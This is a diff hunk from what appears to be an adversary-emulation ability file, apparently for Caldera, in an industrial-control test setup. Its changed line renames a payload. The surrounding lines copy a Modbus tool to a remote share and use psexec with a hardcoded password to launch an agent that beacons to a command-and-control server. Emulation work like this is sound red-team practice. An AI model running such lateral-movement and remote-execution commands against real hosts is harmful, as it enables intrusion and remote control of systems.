@@ -14,6 +14,6 @@
           Copy-Item -Path "C:\Users\Public\modbus_cli.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
           Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\192.168.95.25', '-u', 'txone', '-p', '12345678', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx86.exe" -server http://172.18.25.10:8888 -group tx2' -NoNewWindow;
         payloads:
-          - sandcat-upx86.exe
+          - sandcat.exe
           - modbus_cli.exe
           - psexec.exe
